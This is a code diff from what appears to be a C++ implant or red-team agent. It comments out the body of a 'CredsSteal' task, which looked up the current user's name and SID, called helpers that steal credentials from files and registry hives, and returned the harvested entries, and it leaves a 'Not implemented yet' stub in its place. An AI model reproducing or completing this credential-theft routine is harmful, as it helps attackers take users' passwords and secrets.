@@ -117,56 +117,58 @@ namespace Task
 {
     std::wstring CredsSteal(State::PSTATE pState)
     {
-        std::wstring result = L"";
+        // std::wstring result = L"";
 
-        std::wstring wAccountName = System::User::UserAccountNameGet();
-        if (wAccountName == L"")
-        {
-            return L"Error: Failed to get the current account name.";
-        }
-        std::vector<std::wstring> wAccountNameSplit = Utils::Split::Split(wAccountName, L'\\');
-        std::wstring wUserName = wAccountNameSplit[1];
+        // std::wstring wAccountName = System::User::UserAccountNameGet();
+        // if (wAccountName == L"")
+        // {
+        //     return L"Error: Failed to get the current account name.";
+        // }
+        // std::vector<std::wstring> wAccountNameSplit = Utils::Split::Split(wAccountName, L'\\');
+        // std::wstring wUserName = wAccountNameSplit[1];
 
-        std::wstring wUserSID = System::User::UserSIDGet(pState->pProcs);
-        if (wUserSID == L"")
-        {
-            return L"Error: Failed to get the current user SID.";
-        }
+        // std::wstring wUserSID = System::User::UserSIDGet(pState->pProcs);
+        // if (wUserSID == L"")
+        // {
+        //     return L"Error: Failed to get the current user SID.";
+        // }
 
-        // std::map<std::wstring, std::vector<std::wstring>> wCredsFromRegistryHives = Task::Helper::Creds::StealCredsFromRegistryHives(wUserSID);
-        std::map<std::wstring, std::vector<std::wstring>> wCredsFromFiles = Task::Helper::Creds::StealCredsFromFiles(
-            pState,
-            wUserName,
-            wUserSID
-        );
+        // // std::map<std::wstring, std::vector<std::wstring>> wCredsFromRegistryHives = Task::Helper::Creds::StealCredsFromRegistryHives(wUserSID);
+        // std::map<std::wstring, std::vector<std::wstring>> wCredsFromFiles = Task::Helper::Creds::StealCredsFromFiles(
+        //     pState,
+        //     wUserName,
+        //     wUserSID
+        // );
 
-        if (wCredsFromFiles.size() == 0)
-        {
-            return L"Credentials not found.";
-        }
+        // if (wCredsFromFiles.size() == 0)
+        // {
+        //     return L"Credentials not found.";
+        // }
 
-        auto iter = wCredsFromFiles.begin();
-        while (iter != wCredsFromFiles.end()) {
-            std::vector<std::wstring> wCreds = iter->second;
-            if (wCreds.size() > 0)
-            {
-                std::wstring wTargetFile = iter->first;
-                result += wTargetFile + L":\n";
+        // auto iter = wCredsFromFiles.begin();
+        // while (iter != wCredsFromFiles.end()) {
+        //     std::vector<std::wstring> wCreds = iter->second;
+        //     if (wCreds.size() > 0)
+        //     {
+        //         std::wstring wTargetFile = iter->first;
+        //         result += wTargetFile + L":\n";
 
-                for (DWORD i = 0; i < wCreds.size(); i++)
-                {
-                    result += L" " + wCreds[i] + L"\n";
-                }
-            }
+        //         for (DWORD i = 0; i < wCreds.size(); i++)
+        //         {
+        //             result += L" " + wCreds[i] + L"\n";
+        //         }
+        //     }
 
-            ++iter;
-        }
+        //     ++iter;
+        // }
 
-        if (result == L"")
-        {
-            return L"Credentials not found.";
-        }
+        // if (result == L"")
+        // {
+        //     return L"Credentials not found.";
+        // }
 
-        return result;
+        // return result;
+
+        return L"Not implemented yet.";
     }
 }
